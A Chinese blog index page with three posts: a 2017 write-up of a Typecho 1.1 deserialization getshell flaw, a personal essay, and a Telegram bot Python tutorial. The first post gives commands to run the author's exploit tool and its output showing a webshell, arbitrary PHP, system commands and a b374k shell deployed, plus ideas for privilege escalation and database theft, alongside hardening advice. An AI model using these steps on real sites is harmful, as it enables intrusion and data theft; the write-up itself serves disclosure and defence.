<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>土豆不好吃</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="土豆不好吃">
<meta property="og:url" content="http://example.com/page/13/index.html">
<meta property="og:site_name" content="土豆不好吃">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Benny小土豆">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="土豆不好吃" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">土豆不好吃</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-typecho-exploit/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/10/31/typecho-exploit/index/" class="article-date">
  <time class="dt-published" datetime="2017-10-31T00:00:00.000Z" itemprop="datePublished">2017-10-31</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/justsay/">justsay</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/10/31/typecho-exploit/index/">谈谈近期Typecho 的漏洞exploit及预防措施</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>几天前（28日好像是）Typecho被爆出getshell漏洞，想想还是很可怕的。 [v_error]噢对了，我忘记说了，本文仅供学习交流，请不要在未授权的环境中使用此工具。我图中的测试站，是我现搭建的(对就是不想告诉大家我究竟有多少个域名和服务器…)……你就看那个主机名，miss-ed，思念还是错过，多么符合我的文风啊！[&#x2F;v_error]</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>服务器环境</p>
<blockquote>
<p>nginx&#x2F;1.9.5</p>
<p>PHP 7.0.22</p>
<p>mysql Ver 14.14 Distrib 5.5.48</p>
<p>Typecho 1.1 (17.4.24)（好像是1013还是10月28日之前的都有这个问题）</p>
</blockquote>
<p>有没有人想问为什么是Nginx 1.9.5这么老的版本吗……唔</p>
<p><img src="/images/103117_0858_Typecho1.png"></p>
<p><a target="_blank" rel="noopener" href="https://twitter.com/BennyThinks/status/923164944278814721">真是没有比我还蠢的人了</a></p>
<p>利用条件：PHP对webroot拥有写入权限，www的600就够了。如果Typecho对目录没有写权限，那么……没得玩了。</p>
<p>小知识：很多人对Linux中文件目录权限（rwx）的理解可能是有一些偏差的，以下说明不包含root这个天神，root可以无视这三个基础权限的：</p>
<p>对于文件来说，r代表着能够对文件进行读取；w代表着能够对文件内容进行更改（比如说删除一行，增加一行等等），但是w权限并不意味着能够删除文件；x意味着文件可以作为可执行程序，系统不会告诉你一个permission denied</p>
<p>对于目录来说，r意味着能够对目录下的内容进行list，比如说ls test这就意味着你对test要至少有r才能执行ls；w意味着能够对目录下的文件进行删除、创建、重命名；x意味着能够进入该目录成为工作目录，也就是能够cd test</p>
<p>可能有很多人以为，对文件有w权限就能删掉它了吧？不是的哦，是要对文件所在的目录有w权限才可以的。下面的图是一个简单的验证： <img src="/images/103117_0858_Typecho2.png"></p>
<h2 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h2><p>[gt href&#x3D;’<a target="_blank" rel="noopener" href="https://github.com/BennyThink/Typecho/_deserialization/_exploit'/]GitHub%E5%BC%80%E6%BA%90%E5%9C%B0%E5%9D%80/[/gt/]">https://github.com/BennyThink/Typecho\_deserialization\_exploit&#39;\]GitHub开源地址\[/gt\]</a></p>
<p>git clone <a target="_blank" rel="noopener" href="https://github.com/BennyThink/Typecho/_deserialization/_exploit">https://github.com/BennyThink/Typecho\_deserialization\_exploit</a><br>cd Typecho_deserialization_exploit<br>python exp.ty</p>
<p>之后根据提示操作，示例输出：</p>
<blockquote>
<p>root@qcloud:~&#x2F;Typecho_deserialization_exploit# python exp.py 1. Exploit 2. Run any PHP code. post methods. 3. Run system commands such as ls, pwd 4. Deploy b374k Select your action, q to exit: &gt;1 Input your target, i.e:<a target="_blank" rel="noopener" href="http://localhost/ty">http://localhost/ty</a> &gt;<a href="https://example.com/">https://example.com</a> Your target url is <a href="https://example.com/">https://example.com</a> shell: <a href="https://example.com/p0.php">https://example.com/p0.php</a> 1. Exploit 2. Run any PHP code. post methods. 3. Run system commands such as ls, pwd 4. Deploy b374k Select your action, q to exit: &gt;2 1 . <a href="https://example.com/p0.php">https://example.com/p0.php</a> Enter your target number: &gt;1 Enter your PHP code: &gt;echo ‘pwned’; pwned 1. Exploit 2. Run any PHP code. post methods. 3. Run system commands such as ls, pwd 4. Deploy b374k Select your action, q to exit: &gt;3 1 . <a href="https://example.com/p0.php">https://example.com/p0.php</a> Enter your target number: &gt;1 Enter your system commands: &gt;ls 1. Exploit 2. Run any PHP code. post methods. 3. Run system commands such as ls, pwd 4. Deploy b374k Select your action, q to exit: &gt;4 1 . <a href="https://example.com/p0.php">https://example.com/p0.php</a> Enter your target number: &gt;1 visit <a href="https://example.com/b374k.php">https://example.com/b374k.php</a> 1. Exploit 2. Run any PHP code. post methods. 3. Run system commands such as ls, pwd 4. Deploy b374k Select your action, q to exit: &gt;</p>
</blockquote>
<p>成功写入webshell，第三步执行系统命令没有回显是因为我禁用了<code>system()</code>函数</p>
<p><img src="/images/103117_0858_Typecho3.png"></p>
<p><img src="/images/103117_0858_Typecho4.png"></p>
<p>由于运行PHP的用户是一个低权限的non-login shell用户www，所以嘛……没有SMB那么爽的感觉了。当然Windows就没有这个说法了，说不定人品好，还有人是拿管理员运行的PHP呢……这个时候就可以有mimikatz了。</p>
<h2 id="更进一步的玩法"><a href="#更进一步的玩法" class="headerlink" title="更进一步的玩法"></a>更进一步的玩法</h2><p>只是一点点猜想，仅供参考</p>
<h3 id="内核提权漏洞"><a href="#内核提权漏洞" class="headerlink" title="内核提权漏洞"></a>内核提权漏洞</h3><p>通过<code>phpinfo</code>拿到系统信息，去exploit找对应的内核提权漏洞，想办法吧www提权成root</p>
<h3 id="脱库与跑路"><a href="#脱库与跑路" class="headerlink" title="脱库与跑路"></a>脱库与跑路</h3><p>通过读取Typecho的配置文件<code>config.inc.php</code>拿到数据库账号密码，塞满垃圾文件，脱库与跑路什么的；顺着搜搜有没有MySQL的什么安全漏洞可以利用、绕过。</p>
<h3 id="报告给博主"><a href="#报告给博主" class="headerlink" title="报告给博主"></a>报告给博主</h3><p>对，这才是正经的嘛……当然了，那些连个联系方式也不留的、八百年不发一篇博文的、whois查不到邮箱的、评论也不管的死灰一样的博客，那活该了。我也很无奈啊。</p>
<h2 id="预防措施和一些建议"><a href="#预防措施和一些建议" class="headerlink" title="预防措施和一些建议"></a>预防措施和一些建议</h2><h3 id="升级Typecho到最新的版本或者删除文件"><a href="#升级Typecho到最新的版本或者删除文件" class="headerlink" title="升级Typecho到最新的版本或者删除文件"></a>升级Typecho到最新的版本或者删除文件</h3><p>升级Typecho到最新版本，或者删除<code>install.php</code>和<code>install</code>目录。暂时不能更新的，关站保平安吧。</p>
<h3 id="使用www、mysql等non-login-shell用户运行Apache-x2F-Nginx、PHP、MySQL"><a href="#使用www、mysql等non-login-shell用户运行Apache-x2F-Nginx、PHP、MySQL" class="headerlink" title="使用www、mysql等non-login shell用户运行Apache&#x2F;Nginx、PHP、MySQL"></a>使用www、mysql等non-login shell用户运行Apache&#x2F;Nginx、PHP、MySQL</h3><p>千万不要拿root跑啊，这要是拿root跑了，那就和SMB漏洞是一样一样滴爽。</p>
<h3 id="记得更新系统，不要使用已无支持的操作系统"><a href="#记得更新系统，不要使用已无支持的操作系统" class="headerlink" title="记得更新系统，不要使用已无支持的操作系统"></a>记得更新系统，不要使用已无支持的操作系统</h3><p>EOL（End of Life）的就不要用了，没有安全更新，万一被人找到提权，那不就完蛋了吗。</p>
<p>举例说明，Windows XP，Windows 2003，Windows Vista，CentOS 5,Ubuntu 12.04等等……</p>
<p>对于发行版来说，可以用cron来计划更新，比如说我是这么干的：</p>
<p>0 3 *&#x2F;3 * * apt update &amp;&amp; apt upgrade -y</p>
<p>每隔三天的凌晨三点都会更新一波</p>
<h3 id="尽可能的使用Linux当服务器"><a href="#尽可能的使用Linux当服务器" class="headerlink" title="尽可能的使用Linux当服务器"></a>尽可能的使用Linux当服务器</h3><p>嗯……如果你用Windows的话，在这种情况下webshell就可以大显神通了……</p>
<h3 id="配置php-ini"><a href="#配置php-ini" class="headerlink" title="配置php.ini"></a>配置php.ini</h3><p>配置<code>open_basedir</code>,不让PHP程序访问本身目录以外的目录，比如说我是这么配置的：</p>
<p>open_basedir&#x3D;&#x2F;home&#x2F;wwwroot&#x2F;dmesg.app:&#x2F;tmp&#x2F;:&#x2F;proc&#x2F;</p>
<p>并且如果不需要的话，那么就禁用一些比较危险的函数，比如说<code>system()</code>、<code>exec()</code></p>
<h3 id="别没事干就777"><a href="#别没事干就777" class="headerlink" title="别没事干就777"></a>别没事干就777</h3><p>除非你懂得777是什么意思，知道你这次的777有何影响。</p>
<p>别说777了，任何更改文件目录（包括web目录）权限的操作都要三思而后行，尤其是某些特别敏感的文件，比如说如果某人的<code>/etc/shadow</code>的权限是644（原本应该是640），那么任何人都可以读取了……</p>
<p>小提示：Linux下默认文件目录权限是怎么回事</p>
<p>Linux下有一个东西叫做<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Umask">umask</a>，一般发行版都会是0022，我们只看后三位022，0意味着不拿掉任何权限，2代表拿掉2写权限。</p>
<p>所以对于目录来说，最高权限是rwxrwxrwx（777），那么同组和其他人拿掉写权限，也就是rwxr-xr-xr，换成数字就是755啦；</p>
<p>而文件呢，要比目录再少一个x权限，也就是再<strong>拿掉x</strong>，那么文件就是rw-r–r–也就是644了。为啥要把文件拿掉x可执行权限啊？可执行太危险了呗。</p>
<p>请一定要注意，<strong>不要做减法</strong>（7-2&#x3D;5）！！这样在umask已经拿掉x权限时（umask值包含1，3，5）会出错的。比如说如果umask是011，那么做减法，目录是766（rwx-rw-rw），文件是655（rw-r-xr-x），文件已经拿掉了x，怎么又出现了x呢？？是吧。正确的应该是目录rwx-rw-rw（766），文件拿掉x变为rw-rw-rw（666）</p>
<h3 id="开启App-Armor、SELinux等"><a href="#开启App-Armor、SELinux等" class="headerlink" title="开启App Armor、SELinux等"></a>开启App Armor、SELinux等</h3><p>不好意思，这个我不太会玩……不过……很多人拿到一台CentOS都是……第一步……关闭SELinux的吧……</p>
<h2 id="更多参考资料"><a href="#更多参考资料" class="headerlink" title="更多参考资料"></a>更多参考资料</h2><p><a target="_blank" rel="noopener" href="http://ph0rse.me/2017/10/30/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BTypecho%E4%BA%8C%E8%BF%9E%E7%88%86/">ph0rse</a> <a target="_blank" rel="noopener" href="https://joyqi.com/typecho/about-typecho-20171027.html">joyqi</a> <a target="_blank" rel="noopener" href="http://www.blogsir.com.cn/safe/454.html">blogsir</a> <a target="_blank" rel="noopener" href="https://github.com/b374k/b374k">b374k</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>此次漏洞的影响还是比较大的，至少吧……攻击者能够拿到webshell，再怎么也能拿到整个数据库的权限了。</p>
<p>哦对，trick or treat?</p>
<blockquote>
<p>賢狼ホロ：?羡慕高产（</p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/10/31/typecho-exploit/index/" data-id="clhp7rtmj00aas2qr5aaxhk60" data-title="谈谈近期Typecho 的漏洞exploit及预防措施" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-my-love/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/10/29/my-love/index/" class="article-date">
  <time class="dt-published" datetime="2017-10-29T00:00:00.000Z" itemprop="datePublished">2017-10-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/justsay/">justsay</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/10/29/my-love/index/">眼见何事，情系何处，身在何方，心思何人？</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>我曾经喜欢过一个人。</p>
<p>我和她相识于差不多一年前的12月9日，我记得这么清楚是因为那天我几乎没睡觉，大概是被导员的MacBook所吸引吧。她来找我，是因为她也想像我一样，有一个自己的博客。于是便聊得很开心，相见恨晚。后来我发现我似乎喜欢上她了，后来在23日，也真的是很巧的一天，我把她约出来见面，帮她搭建了Typecho的博客，好像更喜欢她了吧。尽管我的心意早已被她发现，也早已被拒绝，但还是觉得这样无所谓的努力挺好的。</p>
<p>然后一切就这样进行着，为了她我二次开发了一款功能强大的漂亮的Typecho主题，为她提供了很多学习资源，也准备了很多备课资料。甚至是，我没有忘记随想说的一句话，尽可能的去影响身边的人。于是我写出了很多针对性非常强的文章，或者在她的启发引导下写出了很多自觉优秀的文章，有些文章甚至得到了很多大佬的赏识与称赞。甚至是，我带领着她来到墙外，去使用Google，去使用Twitter，去接受自由思想与批判性思维，甚至到后来她有了一个只有我一个联系人的聊天应用：Telegram。</p>
<p>也许就是在这种不明所以的情况下，我开始像有了目标有了动力一样。第一次见面的晚上她说她喜欢Linux和英语好的人，那时我心里暗想，这好像在说我。然后我通过了专八，找到了满意的工作，混得“风生水起”，也更进一步的走向了Linux。</p>
<p>我记不清我都做了些什么，但是每件事情都已经倾尽全力。我们曾经一起出来学习，也去看过IMAX电影。在我最难过最绝望最需要拥抱的时候，她买了樱桃陪我在操场聊天。可能就这样吧，在某个时间点，我以为我们在一起了，我在想，我不知道有多久我没有体验过那种温暖的拥抱。那次在影院里一起看的《敦刻尔克》可能是人生中最美好的一次观影体验了吧，从来不哭的我竟然在送走你之后哭了一晚上。天呐，我大学的第三个梦想，完成了啊。</p>
<p>不，并没有。直到你告诉我你有了男朋友，我才意识到我只完成了前两个梦想。两个月，变化的这么快，连Telegram都从你的手机里消失不见了，不知道一起消失不见的是否也有自由思想、独立思考与批判性思维。我甚至开始害怕发生《伤仲永》那样的事情。</p>
<p>但这些都是我的主观看法啊，也许你只是一直很厌烦我吧，也许我只是在自作多情吧。你的博客停留在一个月前的更新，你的面容也定格在一个月之前。如果我足够理性，我应该继续帮你维护博客，去关注Typecho的开发，去进一步的开发主题，而不是“删库与跑路”吧。</p>
<p>明明与我，我与明明，无论我曾怎样努力，无论我曾怎样与你拥抱，真的要认清这一切了吧。那场欠下的电影与烤鱼，再也见不到了吧……</p>
<p>我该很俗的说一句，祝你幸福。但我是真的希望你幸福，可能这辈子也只能做你的知己，你的好友，只要看到你好，我就开心，不会去打扰你的生活。哦不，可能这辈子也只能做一个很普通的朋友了吧，我只是你的学长，也许只是陌生人吧。你是我曾经深爱的那个学妹。</p>
<p>你好，我的爱人。斯人若彩虹，遇上方知有。</p>
<p>放上这首歌吧，很快再相聚。简直不能找到更合适的歌曲来描述我此时的心情了。你虽离去，但依然留在我心里，留在我的幻梦里。 [netmusic play&#x3D;’0’]27711790[&#x2F;netmusic]</p>
<p> </p>
<p>后记：</p>
<p>当这一切都变得复杂万分，当我知道你对我的信任时，我却不知道该如何是好，我却依旧无法忘记这一切，无法忘记你……你可知我爱你？眼见何事，情系何处，身在何方，心思何人？</p>
<p>你在何方？心思何人？</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/10/29/my-love/index/" data-id="clhp7rthl0055s2qr3s42hhik" data-title="眼见何事，情系何处，身在何方，心思何人？" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-tgbot0/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/10/20/tgbot0/index/" class="article-date">
  <time class="dt-published" datetime="2017-10-20T00:00:00.000Z" itemprop="datePublished">2017-10-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/program/">program</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/10/20/tgbot0/index/">[Telegram bot系列]0：用Python写一个Telegram Bot 简单的回话bot</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>[collapse title&#x3D;””]</p>
<p>[&#x2F;collapse]（我知道我还有一个<a target="_blank" rel="noopener" href="https://dmesg.app/ssh-1.html">SSH系列</a>的坑没填完，别催，越催越不填，再催熄火）</p>
<p>终于，又轮到了小土豆我开新系列的日子啦，这也可能是我的为数不多的讲编程的文章。这一系列中我们将详细说说怎么用Python写一个能玩的Telegram bot，顺便学习一下Python中的一些知识点。</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>假定读者们都知道Telegram是什么，会翻墙并且掌握一定的Python基础。在本系列中我使用Python 2.7和PyCharm，如果要是用Python 3的话最好用Python 3.6</p>
<p>本系列可能会有部分内容翻译自Telegram官方网站，可是官网对于API的说明<strong>非常简明易懂</strong>，而且有的地方还很幽默。<strong>如果英语水平连这都看不懂、理解苦难的话，那说句实在话（不是打击大家），<a target="_blank" rel="noopener" href="https://dmesg.app/other-than-tech.html">还是尽早转行吧</a>。</strong></p>
<p>所以有的时候我也很纠结，我写这一系列干嘛啊，吃饱了没事干么？</p>
<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>未完待定</p>
<h2 id="什么是bot（机器人）"><a href="#什么是bot（机器人）" class="headerlink" title="什么是bot（机器人）"></a>什么是bot（机器人）</h2><p>机器人是一种特殊的不额外需要手机号码的账号。用户可以通过给机器人发消息来进行交互。哎呀反正你们都知道啦。</p>
<p>机器人和普通用户有何不同呢？</p>
<p>机器人没有在线状态、没有上次在线时间；</p>
<p>机器人的存储空间是有限的；</p>
<p>机器人不能主动和用户开启会话，换句话说，要用户先跟它说（或者是添加到群里），他才能回消息；</p>
<p>机器人的用户名结尾永远是bot；</p>
<p>把机器人加到群里的时候，默认情况下（开启隐私模式），机器人是不会收到所有的消息的；</p>
<p>机器人不吃不喝，不睡觉也不抱怨（除非编码太垃圾分分钟抛异常?）。</p>
<h2 id="如何创建一个机器人"><a href="#如何创建一个机器人" class="headerlink" title="如何创建一个机器人"></a>如何创建一个机器人</h2><p>很简单，跟<a target="_blank" rel="noopener" href="https://telegram.me/botfather">BotFather</a>说话，他会指引你创建一个机器人。真的是太简单了，大家去<a target="_blank" rel="noopener" href="https://core.telegram.org/bots">官网自己看</a>吧。</p>
<p>在此系列中，我创建一个名为@benny_demo_bot的机器人，TOKEN为XXX我当然不会告诉你啦。</p>
<p>并且，我使用<code>Edit commands</code>添加了如下命令（start、help、settings是全局命令）：</p>
<blockquote>
<p>start - 自我介绍</p>
<p>help - 帮助</p>
<p>talk - 聊天</p>
</blockquote>
<p><img src="/images/102017_1429_Telegrambot1.png"></p>
<h2 id="搭建开发环境"><a href="#搭建开发环境" class="headerlink" title="搭建开发环境"></a>搭建开发环境</h2><p>众所周知的是，Python可以使用pip来安装一些非常好用的第三方库。这里我们使用了<a target="_blank" rel="noopener" href="https://github.com/eternnoir/pyTelegramBotAPI">pyTelegramBotAPI</a>来和Telegram API进行交互。实际上你想用curl也没人拦着你。</p>
<p>为啥不用另一个star更多的库？我嫌弃那个库麻烦不好用。</p>
<h3 id="准备virtual-environment与pyTelegramBotAPI"><a href="#准备virtual-environment与pyTelegramBotAPI" class="headerlink" title="准备virtual environment与pyTelegramBotAPI"></a>准备virtual environment与pyTelegramBotAPI</h3><p>Virtual environment就是一个虚拟出来的纯净的、不包含第三方库的Python环境（想包含本地已安装的，也不是不行）。</p>
<p>为什么要使用virtual environment呢？唔是这样的，pip默认会把库安装到系统里对应的site-packages里，这样无论你在哪打开Python，都是可以用这个库的。这样听起来好像挺好，但实际上还是有一些弊端的。比如说，在一些项目中，我们最后需要整理出来一个这个项目使用了哪些第三方库，然后指引用户去安装这些库。一个两个还好，多了的话，恐怕开发者也容易找不全、漏掉一些库吧。再加上一些库的依赖、版本等问题，所以如果有必要，那么一定要使用virtual Environment的。</p>
<p>所以我们先创建virtual environment吧。有好几种方式，这里我们就说两种：命令行方式和IDE方式</p>
<h4 id="命令行方式"><a href="#命令行方式" class="headerlink" title="命令行方式"></a>命令行方式</h4><p>首先我们需要安装virtual environment，用<code>pip</code>就可以了，网上教程很多，这里我就简述一下。</p>
<p>pip install virtualenv</p>
<p>如果你使用某些Linux发行版，可能会提示<code>pip: command not found</code>，如果是Debian系的话，那么运行：</p>
<p>sudo apt install python-pip</p>
<p>之后我们创建一个目录，使之成为工程目录：</p>
<p>mkdir bot_demo<br>cd bot_demo<br>#创建virtualenv<br>virtualenv ENV<br>#激活virtualenv（Windows）<br>ENV\Scripts\activate<br>#激活virtualenv（Linux）<br>source ENV&#x2F;bin&#x2F;activate</p>
<p>此时命令行前面会变成(ENV)，代表着已经进入了。这个时候再运行pip就会安装到虚拟环境中</p>
<p>pip install pyTelegramBotAPI</p>
<h4 id="IDE方式"><a href="#IDE方式" class="headerlink" title="IDE方式"></a>IDE方式</h4><p>使用IDE相比来说很方便。我们只需要新建一个项目，File - Settings - Project interpreter,右侧的齿轮里即可选择create VirtualEnv</p>
<p><img src="/images/102017_1429_Telegrambot2.png"></p>
<p>我建议将VirtualEnv选择到工程目录下，这样方便我们判断哪个VirtualEnv对应哪个项目。当然，如果你打算把代码push到GitHub，记得把这个目录加到<code>.gitignore</code>里。</p>
<p>之后我们点击加号，安装<code>pyTelegramBotAPI</code>这个package，PyCharm就会自动为我们安装好这个包了。</p>
<p><img src="/images/102017_1429_Telegrambot3.png"></p>
<h2 id="开始你的项目"><a href="#开始你的项目" class="headerlink" title="开始你的项目"></a>开始你的项目</h2><h3 id="我该怎么处理我的TOKEN"><a href="#我该怎么处理我的TOKEN" class="headerlink" title="我该怎么处理我的TOKEN"></a>我该怎么处理我的TOKEN</h3><p>为了方便项目的扩展，咱一般都会把配置信息放在一个Python文件中。但是，咱知道，像TOKEN这类东西都是比较敏感的，如果要打算把代码push到GitHub，那么<strong>很容易就会泄露这类敏感信息</strong>。也千万别以为删除这些信息了就万事大吉了。要知道<strong>时光机可是Git的能力之一</strong>。万一不幸发生了这种事情，推荐大家用BFG抹掉历史纪录，详细教程可以<a target="_blank" rel="noopener" href="https://dmesg.app/git-password.html">参考我</a>。</p>
<p>那从头开始预防这件事，咱该怎么做呢？一个非常愚蠢但是有效的办法是，新建一个名为<code>config.py</code>的文件，此文件用于保存你的配置信息，并将其加到<code>.gitignore</code>中，另外复制一个名为<code>config-example.py</code>，此文件内容与<code>config.py</code>一致，只是不包含TOKEN敏感信息。</p>
<p>为什么咱不直接把<strong>不包含</strong>敏感信息的<code>config.py</code>先push上去，然后加入自己的TOKEN，之后再加入到<code>.gitignore</code>中呢？其实这样要倍加小心，哦是这样的，gitignore管不到已经在历史记录中的文件的。</p>
<p>另外，如果你使用私有仓库（并且打算以后公开），那就更简单了。可以什么都不管直接push上去，再打算公开之前抹掉TOKEN再push，然后用BFG抹掉历史记录再force push就可以了。</p>
<p>另一个更好的办法是，创建一个<code>config.py</code>但是不在这里写入真实的配置信息，转而设置环境变量然后用<code>os.environ</code>加判断获取到对应的KEY，如果使用PyCharm的话，在Run&#x2F;Debug configuration里就可以添加环境变量，当然直接在命令行里设置也可以（windows要用<code>set xxx=&#39;123&#39;</code>, Linux直接<code>export xxx=&#39;123&#39;</code>设置可以考虑写入<code>.bashrc</code>里）</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/10/2017112102585531.jpg"><img src="/images/2017112102585531-300x116.jpg"></a></p>
<h3 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h3><p>这里由于只是一个演示，并不打算push到GitHub，所以就不处理TOKEN啦。</p>
<p>很显然，我们需要一个<code>config.py</code>用于保存配置文件，还需要一个”主程序”，这里我就很无耻的叫它<code>main.py</code>啦。</p>
<p><img src="/images/102017_1429_Telegrambot4.png"></p>
<p>一些解释：</p>
<p>第一行的<code>#!/usr/bin/python</code>用于指定当给文件加x权限并执行时(<code>./main.py</code>)该使用哪个解释器，用法和shell编程中的是一样的；</p>
<p>第二行用于指定编码格式，下面则是注释说明与doc啦。大家不好奇这些是怎么来的吗？实际上是IDE自动生成的啦。我才懒得自己打这些玩意。</p>
<p>在设置中的如下位置即可设定模板，更多信息可以参考<a target="_blank" rel="noopener" href="https://www.jetbrains.com/help/pycharm/creating-and-editing-file-templates.html">JetBrains</a>官网。</p>
<p><img src="/images/102017_1429_Telegrambot5.png"></p>
<h3 id="config-py"><a href="#config-py" class="headerlink" title="config.py"></a>config.py</h3><p>显然我们要在这里放入TOKEN，所以我们直接写一行<code>TOKEN=&#39;XXX&#39;</code>即可。我一般习惯把这类变量全大写，给人“常量”的感觉嘛（实际上Python中是没有常量这个概念的）。如下所示</p>
<p><img src="/images/102017_1429_Telegrambot6.png"></p>
<p>看这时间戳，我写一篇文章容易嘛我！几个小时了……</p>
<h3 id="main-py"><a href="#main-py" class="headerlink" title="main.py"></a>main.py</h3><p>首先我们需要import库和我们的配置文件并创建telebot类的实例</p>
<p>import telebot<br>from config import TOKEN<br>bot &#x3D; telebot.TeleBot(TOKEN)</p>
<p>定义接受&#x2F;start和命令的消息处理函数，如果多个命令都用这一个函数处理，就这样<code>[&#39;start&#39;,&#39;help&#39;]</code></p>
<p>@bot.message_handler(commands&#x3D;[‘start’])<br>def send_welcome(message):<br>    bot.send_message(message.chat.id, ‘大家好，我是机器人’)</p>
<p>定义接受所有消息的处理函数</p>
<p>@bot.message_handler()<br>def echo(message):<br>    bot.reply_to(message, message.text)</p>
<p>另一种reply_to</p>
<p>@bot.message_handler(commands&#x3D;[‘help’])<br>def send_welcome(message):<br>    bot.send_message(reply_to_message_id&#x3D;message.message_id, chat_id&#x3D;message.chat.id, text&#x3D;’有什么可以帮您’)</p>
<p>定义程序的入口：</p>
<p>if __name__ &#x3D;&#x3D; ‘__main__‘:<br>    bot.polling()</p>
<p>我来解释一下：</p>
<h4 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h4><p>在每个函数前面，我们可以看到有一个<code>@bot.message_handler</code>，这其实是一个Python装饰器。装饰器其实是一个起初听起来觉得什么用都没有、但是用起来却很方便的高阶Python功能。简单说，装饰器可以在运行时改变或增加函数的功能。此话怎讲？</p>
<p>比如说，我们需要在函数开始运行、结束运行的时候输出消息到控制台，大家可能会想着在函数开始和结尾加两个<code>print</code>。没错这样是可以的，但是假如我们有10个函数呢？这代码都没能重用，删除的时候还要删除20次。由于函数在Python中是一等公民，我们可以定义一个嵌套函数（也就是装饰器），配合Python的语法糖@来实现这一功能。</p>
<p>在我们说的打印日志这个例子中，装饰器就可以这么写这么用：</p>
<p><img src="/images/102017_1429_Telegrambot7.png"></p>
<p>当然在这个例子中，这个装饰器无法处理带参数的函数。要处理函数的参数，我们需要在内层的<code>wrapper</code>的参数中使用<code>*args</code>和<code>**kwargs</code>来处理参数（和关键字参数），关于装饰器更多的内容，可以参考奔跑的蜗牛壳<a target="_blank" rel="noopener" href="https://www.tougetu.com/2017/02/python-decorator.html">《Python 装饰器》</a></p>
<h4 id="message"><a href="#message" class="headerlink" title="message"></a>message</h4><p>Telegram API会返回给我们一组JSON，但是控制台用<code>print</code>打印出来的JSON都是一行，看起来很不舒服，解决方法是使用<code>pprint</code>或者新建一个扩展名为json的文件，将一行json放入，Ctrl + Alt + L格式化。</p>
<p>在message这个参数中，有几个是比较重要的，我说几个个人比较常用的：</p>
<p><code>message.chat.id</code> 类型为int，聊天ID，如果是和机器人私聊，那么这个ID也就是用户的user_id；如果是群组的话，那么就是群组的id</p>
<p><code>message.text</code> 类型为unicode，用户发给机器人的聊天内容</p>
<p><code>message.message_id</code> 类型为int，用户发给机器人的消息编号，再使用”回复”功能时会用到这个编号。</p>
<h4 id="send-message与reply-to-message"><a href="#send-message与reply-to-message" class="headerlink" title="send_message与reply_to_message"></a>send_message与reply_to_message</h4><p><code>send_message</code>用于给用户发送消息，必须要有至少两个参数，一个是<code>chat_id</code>，一个是text；</p>
